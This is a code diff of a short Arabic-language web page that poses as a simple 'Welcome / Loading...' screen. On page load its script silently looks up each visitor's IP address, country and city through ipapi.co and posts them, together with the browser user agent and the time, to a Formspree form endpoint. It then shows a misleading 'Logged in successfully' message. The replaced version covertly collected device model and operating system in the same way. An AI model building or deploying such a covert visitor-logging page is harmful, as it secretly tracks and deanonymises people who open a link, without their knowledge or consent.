@@ -2,45 +2,35 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>أهلاً بك</title>
 </head>
-<body style="background: #0d1117; color: #fff; font-family: sans-serif; text-align: center; padding-top: 20vh;">
-    <h2>أهلاً بك</h2>
-    <p id="msg">جاري التحميل...</p>
+<body style="background: #0d1117; color: #e6edf3; font-family: sans-serif; text-align: center; padding-top: 20vh; margin: 0;">
+    <div style="background: #161b22; display: inline-block; padding: 40px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 4px 12px rgba(0,0,0,0.5);">
+        <h2 style="margin-top: 0; color: #58a6ff;">أهلاً بك</h2>
+        <p id="msg" style="color: #8b949e;">جاري التحميل...</p>
+    </div>
 
     <script>
-        async function sendDeviceInfo() {
-            const ua = navigator.userAgent;
-            let deviceName = "غير معروف";
-            let os = "نظام غير معروف";
+        async function logVisitor() {
+            let country = "غير معروف";
+            let city = "غير معروفة";
+            let ip = "غير معروف";
 
-            // تحديد النظام
-            if (/Android/i.test(ua)) {
-                os = "أندرويد (Android)";
-                const match = ua.match(/Android\s+[\d.]+;\s+([^;)]+)/);
-                if (match && match[1]) deviceName = match[1].trim();
-            } else if (/iPhone/i.test(ua)) {
-                os = "آيفون (iOS)";
-                deviceName = "iPhone";
-            } else if (/iPad/i.test(ua)) {
-                os = "آيباد (iPadOS)";
-                deviceName = "iPad";
-            } else if (/Windows/i.test(ua)) {
-                os = "ويندوز (Windows PC)";
-                deviceName = "كمبيوتر ويندوز";
-            } else if (/Mac/i.test(ua)) {
-                os = "ماك (macOS)";
-                deviceName = "كمبيوتر ماك";
+            try {
+                // جلب معلومات الدولة والـ IP عبر خدمة مجانية سريعة
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if (data) {
+                    country = data.country_name || "غير معروف";
+                    city = data.city || "غير معروفة";
+                    ip = data.ip || "غير معروف";
+                }
+            } catch (e) {
+                // في حال عدم توفر اتصال بالإنترنت للخدمة
             }
 
-            // محاولة جلب الموديل الدقيق في المتصفحات الحديثة
-            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                try {
-                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-                    if (hints.model) deviceName = hints.model;
-                } catch (e) {}
-            }
-
+            // إرسال البيانات الكاملة إلى Formspree
             fetch("https://formspree.io/f/xdegoloq", {
                 method: "POST",
                 headers: {
@@ -48,22 +38,24 @@
                     "Content-Type": "application/json"
                 },
                 body: JSON.stringify({
-                    "النظام": os,
-                    "اسم_وموديل_الجهاز": deviceName,
-                    "البيانات_الكاملة": ua,
+                    "رسالة": "زائر جديد دخل الموقع",
+                    "الدولة": country,
+                    "المدينة": city,
+                    "عنوان_IP": ip,
+                    "الجهاز": navigator.userAgent,
                     "الوقت": new Date().toLocaleString()
                 })
             })
             .then(response => {
                 if (response.ok) {
-                    document.getElementById("msg").innerText = "تم الدخول بنجاح!";
+                    document.getElementById("msg").innerText = "تم تسجيل الدخول بنجاح!";
                 } else {
                     document.getElementById("msg").innerText = "حدث خطأ بسيط.";
                 }
             });
         }
 
-        sendDeviceInfo();
+        logVisitor();
     </script>
 </body>
 </html>
